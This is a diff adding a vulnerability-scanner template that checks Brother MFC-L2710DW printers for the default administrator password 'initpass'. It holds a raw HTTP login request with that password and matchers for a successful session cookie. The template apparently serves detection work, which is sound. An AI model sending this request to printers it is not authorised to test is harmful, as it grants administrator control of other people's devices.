@@ -1,0 +1,35 @@
+id: mfc-l2710dw-default-password
+info:
+  name: MFC-L2710DW Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    The MFC-L2710DW printer device has a default password vulnerability (password: initpass). Attackers can control the entire platform and use administrator privileges to operate core functions.
+  tags:
+    - default-password
+  reference:
+    - https://support.brother.com/
+  classification:
+    cvss-metrics: "5.0"
+
+http:
+  - raw:
+      - |
+        POST /general/status.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        CSRFToken=lPRQjQ5KASuaRuxSkRh7KmQIYWY602w4AA%3D%3D&B8d5=initpass&loginurl=%2Fgeneral%2Fstatus.html
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 301
+      - type: word
+        part: header
+        words:
+          - Set-Cookie
+      - type: word
+        part: header
+        words:
+          - AuthCookie
